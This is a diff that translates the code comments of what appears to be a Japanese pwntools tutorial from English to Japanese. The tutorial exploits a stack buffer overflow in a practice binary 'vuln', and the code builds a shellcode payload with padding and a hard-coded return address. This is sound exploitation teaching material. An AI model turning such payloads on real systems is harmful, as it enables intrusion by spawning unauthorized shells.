@@ -94,9 +94,9 @@ p = process()
 あとは pwntools の素晴らしいシェルコード機能を使えば、_驚くほど_簡単です。
 
 ```python
-payload = asm(shellcraft.sh())          # The shellcode
-payload = payload.ljust(312, b'A')      # Padding
-payload += p32(0xffffcfb4)              # Address of the Shellcode
+payload = asm(shellcraft.sh())          # シェルコード
+payload = payload.ljust(312, b'A')      # パディング
+payload += p32(0xffffcfb4)              # シェルコードのアドレス
 ```
 
 そう、これだけです。送信して、シェルとやり取りできる `p.interactive()` を使いましょう。
@@ -142,9 +142,9 @@ context.binary = ELF('./vuln')
 
 p = process()
 
-payload = asm(shellcraft.sh())          # The shellcode
-payload = payload.ljust(312, b'A')      # Padding
-payload += p32(0xffffcfb4)              # Address of the Shellcode
+payload = asm(shellcraft.sh())          # シェルコード
+payload = payload.ljust(312, b'A')      # パディング
+payload += p32(0xffffcfb4)              # シェルコードのアドレス
 
 log.info(p.clean())
 
